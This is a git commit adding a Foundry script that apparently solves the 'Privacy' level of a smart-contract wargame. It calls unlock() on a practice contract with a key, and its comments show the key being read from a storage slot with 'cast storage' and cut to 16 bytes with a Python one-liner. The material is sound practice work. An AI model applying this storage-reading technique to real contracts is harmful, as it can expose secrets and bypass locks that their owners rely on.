c20eac31d7f333fca5f66b4c4646f64f289fb925
aestera <aest3ra@gmail.com>
2025-02-08 12:29:30 +0900

    [LEVEL 12] Privacy Solved

--- script/Privacy.s.sol
+++ script/Privacy.s.sol
@@ -1,1 +1,26 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
 
+import "../src/Privacy.sol";
+import "forge-std/Script.sol";
+import "forge-std/console.sol";
+
+contract PrivacySolution is Script {
+
+    address target = 0xCC93c7377c86939384cD99D5A93e3C9Bc4548298;
+    Privacy privacy = Privacy(target);
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        privacy.unlock(0x61fbc9d658ffc07d52c74b8b2ee73466);
+        console.log("Locked : ", privacy.locked());
+        
+        vm.stopBroadcast();
+    }
+}
+
+// cast storage 0xCC93c7377c86939384cD99D5A93e3C9Bc4548298 5
+// 0x61fbc9d658ffc07d52c74b8b2ee734663d8254941569788583e82cc6bbd0e20f
+
+// python -c 'data="61fbc9d658ffc07d52c74b8b2ee734663d8254941569788583e82cc6bbd0e20f"; print(data[:32])'
+// 61fbc9d658ffc07d52c74b8b2ee73466
